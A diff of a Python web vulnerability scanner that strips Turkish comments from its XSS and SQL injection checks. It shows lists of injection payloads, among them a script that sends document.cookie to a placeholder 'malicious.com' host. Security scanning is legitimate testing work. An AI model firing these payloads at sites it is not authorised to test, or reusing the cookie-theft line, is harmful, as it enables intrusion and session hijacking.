@@ -16,7 +16,6 @@ from multiprocessing import Pool
 from datetime import datetime
 from urllib.parse import urlparse
 
-# Loglama ve dosya yolu tanımları
 log_file = "scan.log"
 logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
@@ -76,7 +75,7 @@ def check_js_files(subdomain, js_files):
         notify(f"[*] Checking {js_file} with LinkFinder...")
         linkfinder_cmd = f"python3 linkfinder.py -i {js_file} -o cli"
         result = run_command(linkfinder_cmd)
-        if "critical vulnerability" in result:  # Kritikal açık kontrolü için uygun koşulu kullanın
+        if "critical vulnerability" in result: 
             if subdomain not in vulnerabilities['js_vulnerabilities']:
                 vulnerabilities['js_vulnerabilities'][subdomain] = []
             vulnerabilities['js_vulnerabilities'][subdomain].append(js_file)
@@ -96,18 +95,17 @@ def check_xss(subdomain, directories):
         url = f"http://{subdomain}{directory}"
         notify(f"[*] Checking XSS vulnerability in {url}...")
 
-        # Gelişmiş XSS payload'lar
         xss_payloads = [
-            "<script>alert('XSS')</script>",  # Basit XSS payload
-            "<img src=x onerror=alert('XSS')>",  # Basit XSS payload
-            "' OR '1'='1",  # SQL payloads'un XSS ile kullanılabilir versiyonu
-            "<svg/onload=alert('XSS')>",  # SVG XSS payload
-            "<iframe src='javascript:alert(1)'></iframe>",  # Iframe XSS payload
-            "<body onload=alert('XSS')>",  # Onload XSS payload
-            "<script>fetch('http://malicious.com?cookie=' + document.cookie)</script>",  # Cookie XSS
-            "<a href='javascript:alert(1)'>Click me</a>",  # Link XSS payload
-            "<input type='text' value='<script>alert(1)</script>'>",  # Input XSS payload
-            "<script>console.log(document.cookie)</script>"  # Console XSS payload
+            "<script>alert('XSS')</script>", 
+            "<img src=x onerror=alert('XSS')>", 
+            "' OR '1'='1", 
+            "<svg/onload=alert('XSS')>", 
+            "<iframe src='javascript:alert(1)'></iframe>", 
+            "<body onload=alert('XSS')>", 
+            "<script>fetch('http://malicious.com?cookie=' + document.cookie)</script>", 
+            "<a href='javascript:alert(1)'>Click me</a>", 
+            "<input type='text' value='<script>alert(1)</script>'>",  
+            "<script>console.log(document.cookie)</script>" 
         ]
 
         for payload in xss_payloads:
@@ -127,19 +125,18 @@ def check_sql_injection(subdomain, directories):
         url = f"http://{subdomain}{directory}"
         notify(f"[*] Checking SQL injection vulnerability in {url}...")
 
-        # Gelişmiş SQL injection payload'lar
         sql_payloads = [
-            "' OR '1'='1'; --",  # Basit SQL injection
-            "' OR '1'='1'/*",  # Yorum satırı ile SQL injection
-            "' UNION SELECT NULL, NULL, NULL --",  # UNION SQL injection
-            "' AND 1=CONVERT(int, @@version) --",  # Version numarası ile SQL injection
-            "' AND 1=1 AND EXISTS (SELECT * FROM information_schema.tables) --",  # Schema bilgisi ile SQL injection
-            "' AND 1=1 AND (SELECT COUNT(*) FROM mysql.user) > 0 --",  # MySQL user count ile SQL injection
-            "' AND 1=1 AND (SELECT * FROM pg_catalog.pg_tables) IS NOT NULL --",  # PostgreSQL tables ile SQL injection
-            "' AND 1=1 AND (SELECT * FROM sysobjects) IS NOT NULL --",  # MSSQL objects ile SQL injection
+            "' OR '1'='1'; --", 
+            "' OR '1'='1'/*", 
+            "' UNION SELECT NULL, NULL, NULL --", 
+            "' AND 1=CONVERT(int, @@version) --",  
+            "' AND 1=1 AND EXISTS (SELECT * FROM information_schema.tables) --",
+            "' AND 1=1 AND (SELECT COUNT(*) FROM mysql.user) > 0 --", 
+            "' AND 1=1 AND (SELECT * FROM pg_catalog.pg_tables) IS NOT NULL --",
+            "' AND 1=1 AND (SELECT * FROM sysobjects) IS NOT NULL --",
             "' AND 1=1 AND (SELECT * FROM performance_schema.threads) IS NOT NULL --",
-            # Performance schema ile SQL injection
-            "' AND 1=1 AND (SELECT @@version) = '10.4.6-MariaDB' --"  # Versiyon numarası ile SQL injection
+
+            "' AND 1=1 AND (SELECT @@version) = '10.4.6-MariaDB' --" 
         ]
 
         for payload in sql_payloads:
@@ -258,7 +255,7 @@ def process_subdomain(subdomain):
 
 
 def main(domain, threads):
-    # Ana domain üzerinde güvenlik taramaları
+
     notify(f"[*] Starting security checks on main domain {domain}...")
     main_directory = dirsearch_scan(f"http://{domain}")
     check_xss(domain, main_directory)
@@ -266,7 +263,7 @@ def main(domain, threads):
     check_csrf(domain, main_directory)
     check_open_redirects(domain, main_directory)
 
-    # Alt alan adları üzerinde güvenlik taramaları
+
     subdomains = find_subdomains(domain)
     alive_subdomains = check_alive_subdomains(subdomains)
 
